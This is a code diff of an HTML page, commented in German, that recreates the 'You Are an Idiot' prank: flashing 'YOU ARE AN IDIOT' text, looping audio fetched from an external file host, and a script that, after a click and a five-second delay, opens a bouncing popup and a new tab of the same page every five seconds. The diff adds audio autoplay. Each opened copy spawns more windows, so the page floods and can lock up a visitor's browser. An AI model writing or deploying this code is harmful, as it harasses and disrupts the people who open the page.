@@ -16,14 +16,14 @@
     }
 
     h1 {
-      font-size: 60px;
+      font-size: 100px; /* gleiche Größe wie dein Beispiel */
       animation: flash 1s infinite, bounce 2s infinite;
       text-align: center;
     }
 
     @keyframes flash {
       0%   { color: white; }
-      50%  { color: black; } /* Schrift "verschwindet" auf Schwarz */
+      50%  { color: black; } /* Schrift "verschwindet" */
       100% { color: white; }
     }
 
@@ -37,7 +37,7 @@
   <h1>YOU ARE AN IDIOT ☻☻☻</h1>
 
   <!-- Audio -->
-  <audio id="idiotAudio" loop>
+  <audio id="idiotAudio" autoplay loop>
     <source src="https://files.catbox.moe/pnlmyb.mp3" type="audio/mpeg">
   </audio>
 
@@ -48,18 +48,18 @@
       if (!started) {
         started = true;
 
-        // Nach 5 Sekunden geht's los
+        // Startverzögerung 5 Sekunden
         setTimeout(() => {
           const audio = document.getElementById("idiotAudio");
           audio.play();
 
-          // Alle 5 Sekunden neues Popup + Tab
+          // Alle 5 Sekunden ein Popup + Tab
           setInterval(() => {
             // Popup öffnen
             const newWin = window.open(window.location.href, "_blank", "width=400,height=200");
-            
+
+            // Popup hüpfen lassen
             if (newWin) {
-              // Popup hüpfen lassen
               let pos = 0;
               let dir = 1;
               setInterval(() => {
@@ -72,11 +72,12 @@
               }, 200);
             }
 
-            // Zusätzlich ein neuer Tab
+            // Neuer Tab
             window.open(window.location.href, "_blank");
+
           }, 5000);
 
-        }, 5000); // Startverzögerung
+        }, 5000);
       }
     });
   </script>
